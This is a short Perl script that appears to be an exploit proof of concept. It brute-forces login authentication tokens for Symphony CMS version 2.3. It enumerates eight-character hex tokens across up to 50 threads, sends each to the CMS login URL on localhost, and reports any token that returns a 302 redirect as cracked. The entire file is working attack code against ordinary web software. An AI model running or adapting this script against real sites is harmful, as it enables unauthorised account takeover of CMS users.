#!/usr/bin/perl
# Brute force authentication tokens of symphony-cms version 2.3 users
# Other versions may be affected

use strict;
use warnings;
use LWP::UserAgent;
use threads;
#use Thread::Queue;

my $max_threads = 50;
my @hexc = qw(0 1 2 3 4 5 6 7 8 9 a b c d e f);
my @threadlist;
&check_token('0' x 8);
&munge('0' x 8, 0);

sub munge {
    my ($word, $index) = @_;
    my @pwchar = split //, $word;
    if ($index >= length($word)) {
        return;
    }
    foreach my $chr (@hexc) {
      if ($chr eq $pwchar[$index]) {
         next;
      }
      @threadlist = threads->list(threads::running);
      while (scalar(@threadlist) >= $max_threads) {
          sleep(1);
          print "Waiting: ".scalar(@threadlist)." threads in use\n";
          @threadlist = threads->list(threads::running);
      }
      my $thread = threads->create(\&check_token, substr($word,0,$index).$chr.substr($word,$index+1, length($word)));
      $thread->join();
      undef $thread;
      &munge (substr($word,0,$index).$chr.substr($word,$index+1, length($word)), $index+1);
    }
    &munge($word, $index+1);
}

sub check_token {
    my $token = shift;
    my $lwp = LWP::UserAgent->new;
    $lwp->max_redirect(0);
    my $response = $lwp->get("http://localhost/vvv/symphony-2.3/symphony/login/$token/");
    if ($response->status_line =~ 302) {
        print "CRACKED TOKEN $token\n";
    }
    undef $lwp;
    undef $response;
}

